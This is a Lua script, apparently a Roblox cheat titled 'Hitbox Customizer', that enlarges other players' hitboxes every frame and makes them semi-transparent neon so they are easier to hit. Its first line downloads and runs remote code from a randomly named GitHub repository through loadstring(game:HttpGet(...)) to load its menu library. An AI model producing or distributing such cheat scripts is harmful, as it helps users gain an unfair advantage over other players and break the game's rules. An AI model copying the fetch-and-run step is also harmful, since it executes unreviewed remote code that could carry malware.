--[[
/*

Some old script 

*/
]]

local Lib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/2lwg1cdpiW/eDZzpHyBzi/refs/heads/main/orion2.txt')))()

local Abicjn = Lib:MakeWindow({Name = "Hitbox Customizer", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local aksieiwj = Abicjn:MakeTab({
	Name = "Hitbox",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})



getgenv().Config = {
    X = 5,
    Y = 5,
    Z = 5,
    Enable = false,
}
local axes = { "X", "Y", "Z" }

for _, axis in ipairs(axes) do
    aksieiwj:AddSlider({
        Name = axis,
        Min = 0,
        Max = 50,
        Default = Config[axis],
        Color = Color3.fromRGB(255, 255, 255),
        Increment = 1,
        ValueName = axis,
        Callback = function(v)
            Config[axis] = v
        end
    })
end

aksieiwj:AddToggle({
    Name = "Show Hitbox",
    Default = Config.Enable,
    Callback = function(v)
        Config.Enable = v
    end
})

local originalProperties = {}

local function storeOriginalProperties(player)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        originalProperties[player.Name] = {
            Size = hrp.Size,
            Transparency = hrp.Transparency,
            BrickColor = hrp.BrickColor,
            Material = hrp.Material,
            CanCollide = hrp.CanCollide
        }
    end
end

local function restoreOriginalProperties(player)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if hrp and originalProperties[player.Name] then
        hrp.Size = originalProperties[player.Name].Size
        hrp.Transparency = originalProperties[player.Name].Transparency
        hrp.BrickColor = originalProperties[player.Name].BrickColor
        hrp.Material = originalProperties[player.Name].Material
        hrp.CanCollide = originalProperties[player.Name].CanCollide
        originalProperties[player.Name] = nil
    end
end

local function modifyHumanoidRootPart(player)
    local hrp = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Size = Vector3.new(Config.X, Config.Y, Config.Z)
        hrp.Transparency = 0.6
        hrp.BrickColor = BrickColor.new("Really black")
        hrp.Material = Enum.Material.Neon
        hrp.CanCollide = false
    end
end

game:GetService('RunService').RenderStepped:Connect(function()
    for _, player in pairs(game:GetService('Players'):GetPlayers()) do
        if player.Name ~= game:GetService('Players').LocalPlayer.Name then
            pcall(function()
                if Config.Enable then
				    if not originalProperties[player.Name] then
				        storeOriginalProperties(player)
				    end
				    modifyHumanoidRootPart(player)
				else
				    restoreOriginalProperties(player)
				end
            end)
        end
    end
end)
